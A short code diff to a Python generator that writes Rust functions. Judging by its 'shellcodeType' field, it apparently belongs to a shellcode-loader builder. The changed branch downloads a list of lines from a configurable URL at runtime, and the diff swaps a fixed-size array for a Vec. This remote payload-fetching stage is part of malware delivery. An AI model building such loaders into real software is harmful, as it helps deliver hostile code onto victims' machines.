@@ -54,17 +54,11 @@ fn {self.name}() -> {self.type} {{
 }}
 """
         elif self.shellcodeType == 'list':
+
             return f"""
-fn {self.name}() -> [&'static str; 116] {{
+fn {self.name}() -> Vec<String> {{
     let response = reqwest::blocking::get("{self.url}");
     let responsetext = response.unwrap().text().unwrap();
-    let static_text: &'static str = Box::leak(responsetext.into_boxed_str());
-    let parts: [&'static str; 116] = static_text
-        .split('\\n')
-        .collect::<Vec<_>>()
-        .try_into()
-        .unwrap();
-    parts
+    responsetext.split('\\n').map(String::from).collect()
 }}
 """
-
